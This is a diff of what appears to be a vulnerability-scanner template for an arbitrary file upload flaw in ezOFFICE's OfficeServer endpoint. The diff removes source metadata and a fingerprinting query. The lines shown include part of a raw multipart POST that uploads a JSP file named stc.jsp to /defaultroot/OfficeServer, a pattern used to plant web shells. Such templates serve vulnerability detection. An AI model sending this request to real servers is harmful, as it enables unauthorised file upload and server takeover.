@@ -3,14 +3,8 @@ info:
   name: 万户协同办公平台OfficeServer存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/38f2edb3c45ba4086f5bd61b845c41e0
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 38f2edb3c45ba4086f5bd61b845c41e0
-    fofa: + hunter`app.name="万户 Ezoffice OA"`
 http:
 - raw:
   - 'POST /defaultroot/OfficeServer HTTP/1.1
@@ -54,7 +48,6 @@ http:
     Content-Disposition: form-data; name="file"; filename="stc.jsp"
 
     Content-Type: text/plain
-
 
 
     --00content0boundary00
